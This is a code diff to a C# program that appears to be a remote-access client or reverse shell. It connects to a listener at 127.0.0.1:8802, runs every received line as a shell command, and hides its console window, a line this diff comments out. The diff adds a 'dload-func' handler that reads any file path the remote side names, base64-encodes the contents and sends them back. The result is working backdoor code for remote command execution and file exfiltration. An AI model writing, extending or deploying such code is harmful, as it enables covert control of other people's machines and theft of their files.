@@ -12,7 +12,7 @@ const int SW_HIDE = 0;
 const int SW_SHOW = 5;
 
 var handle = GetConsoleWindow();
-ShowWindow(handle, SW_HIDE);
+//ShowWindow(handle, SW_HIDE);
 
 string host = "127.0.0.1";
 int port = 8802;
@@ -84,7 +84,11 @@ async Task ReceiveMessageAsync(StreamReader reader)
             string? message = await reader.ReadLineAsync();
             if (string.IsNullOrEmpty(message)) continue;
             Print(message);
-            ShellCommand(message);
+            if (message.StartsWith("dload-func"))
+            {
+                await SendFileAsync(message.Replace("dload-func ", ""));
+            }
+            else ShellCommand(message);
         }
         catch
         {
@@ -119,6 +123,28 @@ void ClearConnection()
     Writer = null;
 }
 
+async Task SendFileAsync(string path)
+{
+    try
+    {
+        await Writer.WriteLineAsync($"dload-func {path}");
+        await Writer.FlushAsync();
+        string? response = await Reader.ReadLineAsync();
+        if (response == "dload-ready")
+        {
+            byte[] fileData = File.ReadAllBytes(path);
+            string base64Data = Convert.ToBase64String(fileData);
+            await Writer.WriteLineAsync(base64Data);
+            await Writer.FlushAsync();
+            Console.WriteLine("File has been sent: " + path);
+        }
+    }
+    catch (Exception e)
+    {
+        Console.WriteLine($"Error when sending the file: {e.Message}");
+    }
+}
+
 void Print(string message)
 {
     if (OperatingSystem.IsWindows())
@@ -133,4 +159,3 @@ void Print(string message)
     }
     else Console.WriteLine(message);
 }
-
